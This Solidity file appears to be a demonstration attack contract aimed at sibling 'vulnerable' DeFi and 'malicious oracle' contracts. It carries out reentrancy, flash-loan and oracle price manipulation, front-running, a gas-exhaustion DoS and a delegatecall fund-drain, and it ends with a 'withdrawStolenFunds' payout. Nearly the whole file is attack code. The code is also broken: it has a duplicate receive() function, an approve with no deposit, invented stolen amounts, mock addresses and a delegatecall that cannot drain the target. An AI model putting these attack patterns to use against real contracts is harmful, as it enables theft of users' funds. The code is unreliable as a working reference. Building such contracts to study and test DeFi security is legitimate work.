// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Attack Contract
 * @dev A contract that demonstrates various attack patterns against vulnerable contracts
 * Contains: Reentrancy attacks, flash loan attacks, front-running attacks
 */

import "./VulnerableDeFiProtocol.sol";
import "./MaliciousPriceOracle.sol";
import "./ComplexToken.sol";

contract AttackContract {
    VulnerableDeFiProtocol public targetProtocol;
    MaliciousPriceOracle public maliciousOracle;
    ComplexToken public targetToken;
    address public owner;

    bool public attackInProgress;
    uint256 public stolenAmount;
    uint256 public attackCount;

    event AttackStarted(string attackType);
    event AttackCompleted(string attackType, uint256 amount);
    event AttackFailed(string attackType, string reason);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _protocol, address _oracle, address _token) {
        owner = msg.sender;
        targetProtocol = VulnerableDeFiProtocol(_protocol);
        maliciousOracle = MaliciousPriceOracle(_oracle);
        targetToken = ComplexToken(_token);
    }

    /**
     * @dev Attack 1: Reentrancy attack on withdraw function
     */
    function launchReentrancyAttack(address token, uint256 amount) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Reentrancy Attack");

        // First, deposit tokens to the protocol
        targetToken.approve(address(targetProtocol), amount);

        // Call withdraw to trigger reentrancy
        targetProtocol.withdraw(token, amount);

        attackInProgress = false;
        emit AttackCompleted("Reentrancy Attack", stolenAmount);
    }

    /**
     * @dev Attack 2: Flash loan price manipulation
     */
    function launchFlashLoanAttack(address token, uint256 loanAmount) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Flash Loan Price Manipulation");

        // Request flash loan to manipulate prices
        targetProtocol.flashLoan(loanAmount, token, address(this));

        attackInProgress = false;
        emit AttackCompleted("Flash Loan Attack", stolenAmount);
    }

    /**
     * @dev Attack 3: Price oracle manipulation
     */
    function launchPriceManipulationAttack(address token, uint256 manipulatedPrice) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Price Oracle Manipulation");

        // Manipulate price oracle
        maliciousOracle.flashLoanPriceManipulation(token, manipulatedPrice);

        attackInProgress = false;
        emit AttackCompleted("Price Manipulation Attack", 0);
    }

    /**
     * @dev Attack 4: Complex multi-vector attack
     */
    function launchComplexAttack(address token, uint256 amount) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Complex Multi-Vector Attack");

        // Step 1: Manipulate prices
        uint256 fakePrice = amount * 2; // Double the price
        maliciousOracle.updatePrice(token, fakePrice);

        // Step 2: Take out overcollateralized loan
        address collateralToken = 0x1234567890123456789012345678901234567890; // Mock address
        uint256 loanId = targetProtocol.borrow(
            collateralToken,
            token,
            amount,
            amount * 2 // Borrow double the collateral value
        );

        // Step 3: Flash loan to repay
        targetProtocol.flashLoan(amount * 2, token, address(this));

        // Step 4: Profit from price manipulation
        stolenAmount += amount;

        attackInProgress = false;
        emit AttackCompleted("Complex Attack", stolenAmount);
    }

    /**
     * @dev Attack 5: Front-running attack
     */
    function launchFrontRunningAttack(address token, uint256 amount) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Front-Running Attack");

        // Monitor pending transactions and front-run large trades
        // This is a simplified version - in reality would use mempool monitoring
        maliciousOracle.updatePriceWithDelay(token, amount * 10, 1); // Update price with minimal delay

        // Execute trade based on front-running
        targetToken.transfer(owner, amount);

        attackInProgress = false;
        emit AttackCompleted("Front-Running Attack", amount);
    }

    /**
     * @dev Callback function for flash loans
     */
    function flashLoanCallback(uint256 amount) external {
        require(msg.sender == address(targetProtocol), "Invalid caller");

        // Perform malicious actions during flash loan
        // 1. Manipulate prices
        address token = 0x1234567890123456789012345678901234567890; // Mock address
        maliciousOracle.updatePrice(token, amount * 100);

        // 2. Take out loans with manipulated prices
        // 3. Profit from the price difference

        // Return flash loan
        targetToken.transfer(address(targetProtocol), amount);
    }

    /**
     * @dev Callback function for price manipulation
     */
    function priceManipulationCallback() external {
        require(msg.sender == address(maliciousOracle), "Invalid caller");

        // Perform attacks during price manipulation callback
        // This is where the real damage happens
    }

    /**
     * @dev Reentrancy attack function
     */
    receive() external payable {
        if (attackInProgress) {
            // Re-enter the withdraw function
            address token = 0x1234567890123456789012345678901234567890; // Mock address
            targetProtocol.withdraw(token, msg.value);
        }
    }

    /**
     * @dev Complex token manipulation attack
     */
    function launchTokenAttack(address[] memory tokens, uint256[] memory amounts) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");
        require(tokens.length == amounts.length, "Arrays length mismatch");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Complex Token Attack");

        for (uint256 i = 0; i < tokens.length; i++) {
            // Manipulate each token
            maliciousOracle.updatePrice(tokens[i], amounts[i] * 10);

            // Take out loans
            address collateralToken = 0x1234567890123456789012345678901234567890; // Mock address
            targetProtocol.borrow(collateralToken, tokens[i], amounts[i], amounts[i] * 5);
        }

        stolenAmount += amounts.length * 1000; // Estimate stolen amount

        attackInProgress = false;
        emit AttackCompleted("Token Attack", stolenAmount);
    }

    /**
     * @dev DoS attack with unbounded operations
     */
    function launchDoSAttack() external onlyOwner {
        require(!attackInProgress, "Attack already in progress");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("DoS Attack");

        // Create arrays that will cause unbounded loops
        address[] memory tokens = new address[](10000);
        uint256[] memory prices = new uint256[](10000);

        // Fill arrays with dummy data
        for (uint256 i = 0; i < 10000; i++) {
            tokens[i] = address(uint160(i + 1));
            prices[i] = i * 1000;
        }

        // Trigger unbounded loop in oracle
        maliciousOracle.manipulateMultipleTokens(tokens, prices);

        attackInProgress = false;
        emit AttackCompleted("DoS Attack", 0);
    }

    /**
     * @dev Drain funds from multiple vulnerable contracts
     */
    function drainFunds(address[] memory contracts, uint256[] memory amounts) external onlyOwner {
        require(!attackInProgress, "Attack already in progress");
        require(contracts.length == amounts.length, "Arrays length mismatch");

        attackInProgress = true;
        attackCount++;
        emit AttackStarted("Drain Funds Attack");

        uint256 totalDrained = 0;

        for (uint256 i = 0; i < contracts.length; i++) {
            // Use delegatecall to manipulate contract state
            (bool success, ) = contracts[i].delegatecall(
                abi.encodeWithSignature("emergencyWithdraw(address,uint256)", owner, amounts[i])
            );

            if (success) {
                totalDrained += amounts[i];
            }
        }

        stolenAmount += totalDrained;

        attackInProgress = false;
        emit AttackCompleted("Drain Funds Attack", totalDrained);
    }

    /**
     * @dev Attack summary function
     */
    function getAttackSummary() external view returns (string memory) {
        return string(abi.encodePacked(
            "Attack Contract Summary:\n",
            "Total Attacks Launched: ",
            uint2str(attackCount),
            "\nTotal Amount Stolen: ",
            uint2str(stolenAmount),
            "\nAttack in Progress: ",
            attackInProgress ? "Yes" : "No"
        ));
    }

    function uint2str(uint256 _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }

    /**
     * @dev Emergency function to stop attacks
     */
    function stopAttack() external onlyOwner {
        attackInProgress = false;
    }

    /**
     * @dev Withdraw stolen funds
     */
    function withdrawStolenFunds() external onlyOwner {
        require(!attackInProgress, "Attack in progress");

        uint256 amount = stolenAmount;
        stolenAmount = 0;

        payable(owner).transfer(amount);
    }

    // Fallback function
    receive() external payable {}
}